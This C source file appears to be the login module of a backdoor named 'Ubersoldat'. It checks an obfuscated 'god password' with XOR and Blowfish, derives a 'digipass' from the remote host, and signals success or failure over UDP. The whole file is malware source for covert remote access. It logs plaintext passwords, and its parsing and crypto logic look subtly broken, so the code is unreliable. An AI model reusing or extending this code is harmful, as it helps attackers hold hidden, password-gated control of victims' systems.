#include "stdafx.h"

extern char main_password[];

/* 
* Ubersoldat authentication mechanism.
* Not only legal password and key required, but 4 another digits.
* Scheme follows:
* Assume remote ip : x1.x2.x3.x4
* We need to produce from it four resulting digits. 
* d1 = (x1 + x3 ) ^ 13
* d2 = (x3 * x4) << 2
* d3 = x2 | 8
* d4 = (d1 * 2) >> 4
*
*
* Input: 
* remote                    remote ip user@somehost.com
* god_password              god password
* pwd                       user supplied password
* key                       user supplied key
* digipass                  4 digits as string
*/

int AuthLoginCheckPassword(char *remote, char *god_password, 
	char *pwd, char *key, char *digipass)
{
	DWORD crypt_len;
	char decrypted_password[64];
	char temp[128];

	deb("AUTH: remote: [%s] god_pwd: [%s] pwd: [%s] key: [%s] digipass: [%s]", remote, 
		god_password, pwd, key, digipass);

	z(decrypted_password, sizeof(decrypted_password));

	/* encode from registry xor'ed to real */
	xor_hex_string((u_char*) main_password, (u_char*) decrypted_password, PWD_XOR_KEY);
	deb("decrypted password: %s", decrypted_password);

	/* decrypt using blowfish */
	blowfish_init();
	blowfish_setkey((u_char*) key, strlen(key) + 1);

	strncpy(temp, pwd, sizeof(temp));

	crypt_len = blowfish_encrypt((u_char*) temp, (u_char*) temp, strlen(pwd) + 1);

	deb("crypt_len: val:%s key: %s len:%d", temp, key, crypt_len);

	blowfish_decrypt((u_char*) decrypted_password, (u_char*) decrypted_password, crypt_len);
	blowfish_free();

	if(memcmp(decrypted_password, pwd, strlen(decrypted_password)) != 0) 
	{
		deb("password mismatch: user: %s god: %s", pwd, decrypted_password);
		udp_send_msg(AUTHFAIL, remote, strlen(remote));
		return 1;
	}

	if(AuthCheckDigipass((u_char*) remote, digipass) == 0) 
	{
		deb("digipass OK");
		udp_send_msg(AUTHOK, remote, strlen(remote));
		return 0;
	} 
	else 
	{
		deb("digipass FAIL");
		udp_send_msg(AUTHFAIL, remote, strlen(remote));
		return 1;
	}
}

int AuthCheckDigipass(u_char *remote, char *digipass)
{
	DWORD u1 = 0,u2 = 0,u3 = 0,u4 = 0,d1 = 0,d2 = 0,d3 = 0,d4 = 0,i1 = 0,i2 = 0,i3 = 0,i4 = 0;

	if(sscanf((char*) remote, "%*[^@]@%c%c%c%c", &i1, &i2, &i3, &i4) != 4) 
	{
		deb("bogus remote: %s", remote);
		return -1;
	}

	if(sscanf(digipass, "%d,%d,%d,%d", &u1, &u2, &u3, &u4) != 4) 
	{
		deb("bogus digipass: %s", digipass);
		return -1;
	}

	deb("digipass [%c%c%c%c] ip values: %d %d %d %d", i1, i2, i3, i4, i1, i2, i3, i4);

	/* calc digipass */

	d1 = (i1 + i3) ^ 13;
	d2 = (i3 * i4) << 2;
	d3 = i2 | 8;
	d4 = (d1 * 2) >> 4;

	/* compare with user supplied digipass */

	deb("digipass dump: user: [%d %d %d %d] real: [%d %d %d %d]", 
		u1, u2, u3, u4, d1, d2, d3, d4);

	if(d1 == u1 && d2 == u2 && d3 == u3 && d4 == u4)
		return 0;
	else
		return 1;
}

void AuthChangePassword(u_char*, u_char*)
{

}